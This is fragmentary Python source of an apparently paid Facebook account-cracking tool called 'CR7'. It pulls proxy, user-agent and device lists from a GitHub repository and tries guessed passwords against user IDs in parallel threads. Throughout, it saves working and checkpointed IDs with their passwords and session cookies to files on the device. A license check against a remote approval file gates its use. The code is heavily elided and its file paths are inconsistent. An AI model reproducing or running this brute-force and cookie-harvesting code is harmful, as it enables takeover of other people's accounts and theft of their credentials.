...
try:
	prox= requests.get('https://raw.githubusercontent.com/zoker690 /data/main/proxies.txt').text
...
android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/zoker690 /data/main/strings.txt').text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass
usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/zoker690 /data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO CR7 WORLD          ')
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                   ...
                   # print(f"\r\x1b[1;96m [CR7-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/CR7/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//CR7/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/NIX/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [NIX-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/CR7/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
                       ...
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ...
                                CR7world.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                CR7world.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                linex()
                open('CR7-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                open('CR7-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
...
def main_apv():
    ...
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/zoker690/Paid/blob/main/Approve.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
